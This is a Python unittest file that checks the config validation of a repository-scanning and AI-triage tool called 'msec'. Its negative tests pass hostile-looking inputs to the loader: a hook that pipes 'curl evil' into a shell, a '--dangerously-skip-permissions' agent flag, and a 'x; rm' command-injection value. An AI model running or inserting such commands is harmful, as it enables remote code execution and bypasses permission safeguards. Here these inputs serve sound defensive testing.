import tempfile
import unittest
from pathlib import Path

from msec import config


class ConfigTest(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.root = self.tmp / "repos"
        self.root.mkdir()
        self.claude = self.tmp / "claude"
        self.claude.write_text("")

    def load(self, top="", triage="", delivery=""):
        text = f'scan_roots = ["{self.root}"]\n{top}\n[triage]\nclaude_path = "{self.claude}"\n{triage}\n{delivery}\n'
        p = self.tmp / "config.toml"
        p.write_text(text)
        return config.load(p, state_dir=self.tmp / "state")

    def test_minimal_config_gets_defaults(self):
        cfg = self.load()
        self.assertEqual(cfg.scan_roots, (self.root,))
        self.assertEqual(cfg.timezone, "Europe/Lisbon")
        self.assertEqual(cfg.deliver_after, "08:30")
        self.assertEqual(cfg.adapters, ("macos-notify",))
        self.assertEqual(cfg.triage.auth, "subscription")
        self.assertEqual(cfg.state_dir, self.tmp / "state")

    def test_unknown_top_level_key_rejected(self):
        with self.assertRaises(config.ConfigError):
            self.load(top='hook = "curl evil | sh"')

    def test_unknown_triage_key_rejected(self):
        with self.assertRaises(config.ConfigError):
            self.load(triage='extra_args = ["--dangerously-skip-permissions"]')

    def test_relative_root_rejected_missing_root_allowed(self):
        p = self.tmp / "c.toml"
        p.write_text(f'scan_roots = ["Repos"]\n[triage]\nclaude_path = "{self.claude}"\n')
        with self.assertRaises(config.ConfigError):
            config.load(p, state_dir=self.tmp / "s")
        p.write_text(f'scan_roots = ["{self.tmp}/nope"]\n[triage]\nclaude_path = "{self.claude}"\n')
        self.assertEqual(config.load(p, state_dir=self.tmp / "s").scan_roots, (self.tmp / "nope",))

    def test_unknown_adapter_rejected(self):
        with self.assertRaises(config.ConfigError):
            self.load(delivery='[delivery]\nadapters = ["shell-command"]')

    def test_bad_time_zone_budget_auth_rejected(self):
        for top, triage in [('deliver_after = "25:00"', ""), ('timezone = "Mars/Base"', ""),
                            ("", "max_budget_usd = 50"), ("", 'auth = "token-in-config"'),
                            ("", 'model = "x; rm"'), ("", 'enabled = "yes"')]:
            with self.subTest(top=top, triage=triage), self.assertRaises(config.ConfigError):
                self.load(top=top, triage=triage)

    def test_claude_path_must_be_absolute_but_may_be_missing(self):
        p = self.tmp / "c.toml"
        p.write_text(f'scan_roots = ["{self.root}"]\n[triage]\nclaude_path = "claude"\n')
        with self.assertRaises(config.ConfigError):
            config.load(p, state_dir=self.tmp / "s")
        p.write_text(f'scan_roots = ["{self.root}"]\n[triage]\nclaude_path = "/nonexistent/claude"\n')
        self.assertEqual(config.load(p, state_dir=self.tmp / "s").triage.claude_path, "/nonexistent/claude")
        p.write_text(f'scan_roots = ["{self.root}"]\n[triage]\nenabled = false\n')
        self.assertFalse(config.load(p, state_dir=self.tmp / "s").triage.enabled)

if __name__ == "__main__":
    unittest.main()
